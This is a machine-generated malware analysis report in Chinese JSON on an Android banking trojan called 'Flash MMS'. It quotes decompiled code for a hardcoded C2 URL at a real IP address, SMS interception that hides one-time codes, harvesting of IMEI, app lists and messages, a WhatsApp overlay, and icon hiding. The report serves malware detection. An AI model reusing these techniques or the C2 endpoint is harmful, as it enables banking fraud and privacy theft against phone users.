@@ -1,0 +1,169 @@
+{
+  "APK信息": {
+    "文件名": "e544b04c5faea553e46766397add3aa7d02ed6a8479409cba4c54ad897b90f3c.apk",
+    "sha256": "e544b04c5faea553e46766397add3aa7d02ed6a8479409cba4c54ad897b90f3c",
+    "包名": "exts.whats",
+    "应用名": "Flash MMS",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 144.6
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\whats\\Constants;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://91.224.161.102/?action=command\";\npublic static final String INTERCEPTING_ENABLED = \"INTERCEPTING_ENABLED\";\npublic static final String LOCK_ENABLED = \"LOCK_ENABLED\";\npublic static final int REQUEST_INTERVAL = 60;\npublic static final String[] BINS_WITHOUT_VBV = {\"493598\", \"400319\", ...};",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://91.224.161.102/?action=command\";\n>>>     public static final String APP_ID = \"APP_ID\";\n>>>     public static final String CARD_SENT = \"CARD_SENT\";\n>>>     public static final String INSTALL_ID = \"1\";\n>>>     public static final String INSTALL_SENT = \"INSTALL_SENT\";\n      public static final String INTERCEPTING_ENABLED = \"INTERCEPTING_ENABLED\";\n      public static final String LOCK_ENABLED = \"LOCK_ENABLED\";\n      public static final String PREFS_NAME = \"app_settings\";",
+          "behavior_description": "代码硬编码了C2服务器的IP地址和命令请求接口（http://91.224.161.102/?action=command），应用会以此作为远程控制端点定期（REQUEST_INTERVAL=60秒）拉取指令。结合同文件中存在的设备锁定（LOCK_ENABLED）、短信拦截（INTERCEPTING_ENABLED）以及大量信用卡BIN号段（BINS_WITHOUT_VBV），表明该应用是一个银行木马，通过该C2链接获取控制指令以执行隐私窃取、短信拦截和设备锁定等恶意操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\whats\\MessageReceiver;",
+          "method_signature": "if(needToInterceptIncoming)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\nIntent start = new Intent(context, SendService.class);\nstart.setAction(SendService.REPORT_INCOMING_MESSAGE);\nstart.putExtra(\"number\", sender);\nstart.putExtra(\"text\", text);\ncontext.startService(start);\nif (needToInterceptIncoming) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          Map<String, String> messages = retrieveMessages(intent);\n          for (String sender : messages.keySet()) {\n              String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n>>>             start.putExtra(\"text\", text);\n>>>             context.startService(start);\n>>>             if (needToInterceptIncoming) {\n>>>                 abortBroadcast();\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "该代码作为短信广播接收器，从Intent的pdus中提取短信发送方号码和短信内容，将拦截到的短信通过startService转发给SendService（疑似上报至C2服务器），同时根据配置开关Constants.INTERCEPTING_ENABLED调用abortBroadcast()中止短信广播，使短信无法到达系统默认短信应用，用户完全无法感知被拦截的短信。此行为是银行木马拦截OTP/验证码的典型手法，可直接导致用户资金损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\whats\\utils\\RequestFactory;",
+          "method_signature": "makeReg(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "JSONObject json = new JSONObject();\njson.put(\"imei\", Utils.getDeviceId(context));\njson.put(\"apps\", Utils.getAppList(context));\njson.put(\"sms\", Utils.readMessagesFromDeviceDB(context));",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class RequestFactory {\n      public static JSONObject makeReg(Context context) throws Exception {\n>>>         JSONObject json = new JSONObject();\n>>>         json.put(\"type\", \"install\");\n>>>         json.put(\"country\", Utils.getCountry(context));\n>>>         json.put(\"imei\", Utils.getDeviceId(context));\n          json.put(\"model\", Utils.getModel());\n          json.put(\"apps\", Utils.getAppList(context));\n          json.put(\"operator\", Utils.getOperator(context));",
+          "behavior_description": "该方法构建注册请求JSON对象，采集了设备IMEI、已安装应用列表、短信内容等敏感隐私数据并封装为JSON，准备上传至服务器。其中短信数据库读取(readMessagesFromDeviceDB)和IMEI采集(getDeviceId)属于高危隐私窃取行为，数据流向为：getDeviceId()/readMessagesFromDeviceDB()/getAppList() → JSON封装 → 网络上传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "com.whatsapp"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\whats\\MainService;",
+          "method_signature": "if((packageName.contains(\"com.whatsapp\")",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String packageName = MainService.this.getTop();\nif ((packageName.contains(\"com.whatsapp\") || packageName.contains(\"com.android.vending\")) && !MainService.settings.getBoolean(Constants.CARD_SENT, false)) {\n    Intent i = new Intent(MainService.this, (Class<?>) Cards.class);\n    i.putExtra(\"package\", packageName);\n    i.addFlags(268435456);\n    MainService.this.startActivity(i);\n}",
+          "malicious_code_snippet_context": "          this.injTask = new Runnable() { // from class: exts.whats.MainService.3\n              @Override // java.lang.Runnable\n              public void run() {\n>>>                 String packageName = MainService.this.getTop();\n>>>                 if ((packageName.contains(\"com.whatsapp\") || packageName.contains(\"com.android.vending\")) && !MainService.settings.getBoolean(Constants.CARD_SENT, false)) {\n>>>                     Intent i = new Intent(MainService.this, (Class<?>) Cards.class);\n>>>                     i.putExtra(\"package\", packageName);\n>>>                     i.addFlags(268435456);\n>>>                     MainService.this.startActivity(i);\n>>>                 }\n              }\n          };\n          this.scheduler.scheduleAtFixedRate(this.injTask, 500L, 4000L, TimeUnit.MILLISECONDS);",
+          "behavior_description": "代码通过定时任务获取当前前台应用包名（source: getTop()），当检测到目标应用（如WhatsApp或Google Play）运行时，启动一个Cards Activity覆盖在目标应用之上（sink: startActivity()），用于实施UI覆盖攻击或诱导用户进行社交蠕虫传播等恶意操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lexts\\whats\\Main;",
+          "method_signature": "hide()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private void hide() {\n    PackageManager packageManager = getPackageManager();\n    ComponentName componentName = new ComponentName(this, Main.class);\n    packageManager.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "          finish();\n      }\n  \n>>>     private void hide() {\n>>>         PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>     }\n  }",
+          "behavior_description": "代码通过调用 PackageManager.setComponentEnabledSetting 将应用主组件（Main.class）设置为禁用状态（参数2，即 COMPONENT_ENABLED_STATE_DISABLED），导致应用图标从桌面启动器中隐藏，从而在用户不知情的情况下潜伏运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
